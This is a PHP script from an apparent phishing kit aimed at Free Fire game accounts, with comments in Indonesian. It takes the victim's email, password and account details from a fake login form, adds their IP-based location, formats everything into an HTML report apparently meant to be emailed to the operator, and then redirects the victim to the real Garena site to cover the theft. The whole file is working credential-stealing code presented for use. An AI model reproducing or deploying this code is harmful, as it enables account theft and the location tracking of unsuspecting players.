<?php

include 'setting.php';
include 'geolocation.php';
include 'get.php';
include 'get_callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$level = $_POST['lvl'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$login = $_POST['login'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if(!$email || !$password || !$level || !$rpt || !$rpl || !$login){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$pesan = '
<center> 
<div style="background: url(https://image.winudf.com/v2/image1/Y29tLmR0cy5mcmVlZmlyZXRoX3NjcmVlbl9pZF81XzE1ODI2MDM4MjlfMDY3/screen-6.jpg?fakeurl=1&type=.jpg) no-repeat center center fixed; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">INFORMASI AKUN</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LEVEL AKUN</th>
<th style="width:78%;text-align:center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LEVEL TIER</th>
<th style="width: 78%; text-align: center;"><b>'.$rpl.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ELITE PASS</th>
<th style="width:78%;text-align: center;"><b>'.$rpt.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">INFORMASI TAMBAHAN</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['country_name'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['region_name'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['latitude'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['longitude'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['ip'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/M5LvZfK/fb.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/k1fsCW3/ig.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/xLgTdXs/twitter.png">
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
echo "<script type='text/javascript'>window.top.location='https://ff.garena.com/';</script>";
}
?>